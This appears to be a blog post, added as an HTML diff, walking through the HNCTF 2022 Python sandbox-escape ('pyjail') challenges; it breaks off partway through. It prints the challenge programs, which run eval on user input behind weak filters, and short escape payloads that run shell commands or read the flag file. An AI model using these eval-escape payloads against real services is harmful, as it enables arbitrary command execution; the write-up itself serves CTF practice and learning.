@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="好忙好忙好忙好忙，接下来要飞北京参加线下，速度解决">
+<meta property="og:type" content="article">
+<meta property="og:title" content="H&amp;NCTF-pyjail题单复现">
+<meta property="og:url" content="http://example.com/2025/08/06/Done-H&NCTF-pyjail%E9%A2%98%E5%8D%95%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Twansh&#x2F;Eminem">
+<meta property="og:description" content="好忙好忙好忙好忙，接下来要飞北京参加线下，速度解决">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-08-06T04:14:41.000Z">
+<meta property="article:modified_time" content="2025-08-12T15:45:40.591Z">
+<meta property="article:author" content="Kwansh">
+<meta property="article:tag" content="专题强化练">
+<meta property="article:tag" content="pyjail">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2025/08/06/Done-H&NCTF-pyjail%E9%A2%98%E5%8D%95%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>H&NCTF-pyjail题单复现 | Twansh/Eminem</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Twansh/Eminem</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/08/06/Done-H&NCTF-pyjail%E9%A2%98%E5%8D%95%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Kwansh">
+      <meta itemprop="description" content="往事越千年,魏武挥鞭,东临碣石有遗篇。萧瑟秋风今又是,换了人间">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Twansh/Eminem">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          H&NCTF-pyjail题单复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-08-06 12:14:41" itemprop="dateCreated datePublished" datetime="2025-08-06T12:14:41+08:00">2025-08-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-08-12 23:45:40" itemprop="dateModified" datetime="2025-08-12T23:45:40+08:00">2025-08-12</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">好忙好忙好忙好忙，接下来要飞北京参加线下，速度解决</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="HNCTF-2022-Week1-calc-jail-beginner-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner(JAIL)</h2><p>没有任何的限制</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>经典payload打了即可</p>
+<h2 id="HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL)</h2><p>题目</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#the function of filter will banned some string &#x27;,&quot;,i,b</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`ib&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ __ </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | /_ |</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                  </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                      </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>注意到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`ib&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br></pre></td></tr></table></figure>
+<p>不允许出现这些字符</p>
+<p>拉蒙特徐之前敲打过的，chr构造payload来进行绕过<br>由前面的经验，应该是在flag目录下，直接构造一个payload，改成chr的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">103</span>)).read()</span><br></pre></td></tr></table></figure>
+
+<h2 id="HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL)</h2><p>经典6字符长度绕过<br>help()直接打即可(前面的博客有说明，可自行查阅)</p>
+<h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#the length is be limited less than 13</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ ___  </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | |__ \ </span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ </span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                    </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>12字符的限制</p>
+<p>那很经典了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="built_in">input</span>())</span><br></pre></td></tr></table></figure>
+<p>然后我们可以输入自己需要的payload<br>这里直接打经典payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#the length is be limited less than 13</span></span><br><span class="line"><span class="comment">#it seems banned some payload </span></span><br><span class="line"><span class="comment">#banned some unintend sol</span></span><br><span class="line"><span class="comment">#Can u escape it?Good luck!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    BLACKLIST = [<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;input&quot;</span>,<span class="string">&quot;eval&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i!r&#125;</span> has been banned for security reasons&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _ _                _ ___    _____ </span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | |              | |__ \  | ____|</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  </span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                          </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                            </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">filter</span>(input_data)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">13</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br></pre></td></tr></table></figure>
+
+<p>breakpoint绕过即可，可以查看我前面的博客</p>
+<h2 id="HNCTF-2022-Week1-python2-input-JAIL"><a href="#HNCTF-2022-Week1-python2-input-JAIL" class="headerlink" title="[HNCTF 2022 Week1]python2 input(JAIL)"></a>[HNCTF 2022 Week1]python2 input(JAIL)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># It&#x27;s escape this repeat!</span></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">              _   _      ___        ___    _____             _    _ _   </span></span><br><span class="line"><span class="string">             | | | |    / _ \      |__ \  |_   _|           | |  | | |  </span></span><br><span class="line"><span class="string">  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ </span></span><br><span class="line"><span class="string"> | &#x27;_ \| | | | __| &#x27;_ \| | | | &#x27;_ \  / /    | | | &#x27;_ \| &#x27;_ \| |  | | __|</span></span><br><span class="line"><span class="string"> | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ </span></span><br><span class="line"><span class="string"> | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|</span></span><br><span class="line"><span class="string"> | |     __/ |                                        | |               </span></span><br><span class="line"><span class="string"> |_|    |___/                                         |_|                               </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> WELCOME</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Welcome to the python jail&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;But this program will repeat your messages&quot;</span></span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span> input_data</span><br></pre></td></tr></table></figure>
+
+<p>我擦，python2啊<br>那就有一个不得不提到的特性了</p>
+<blockquote>
+<p>input() 在 Python 2 会 把用户输入当成 Python 代码执行（等同 eval）<br>直接打链子</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;cat flag&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="HNCTF-2022-Week1-lake-lake-lake-JAIL"><a href="#HNCTF-2022-Week1-lake-lake-lake-JAIL" class="headerlink" title="[HNCTF 2022 Week1]lake lake lake(JAIL)"></a>[HNCTF 2022 Week1]lake lake lake(JAIL)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#it seems have a backdoor</span></span><br><span class="line"><span class="comment">#can u find the key of it and use the backdoor</span></span><br><span class="line"></span><br><span class="line">fake_key_var_in_the_local_but_real_in_the_remote = <span class="string">&quot;[DELETED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(key == fake_key_var_in_the_local_but_real_in_the_remote):</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nooo!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _          _       _          _       _        </span></span><br><span class="line"><span class="string"> | |     | |        | |     | |        | |     | |       </span></span><br><span class="line"><span class="string"> | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ </span></span><br><span class="line"><span class="string"> | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \</span></span><br><span class="line"><span class="string"> | | (_| |   &lt;  __/ | | (_| |   &lt;  __/ | | (_| |   &lt;  __/</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Now the program has two functions&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;can you use dockerdoor&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1.func&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2.backdoor&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>有点意思，连一下题目看看</p>
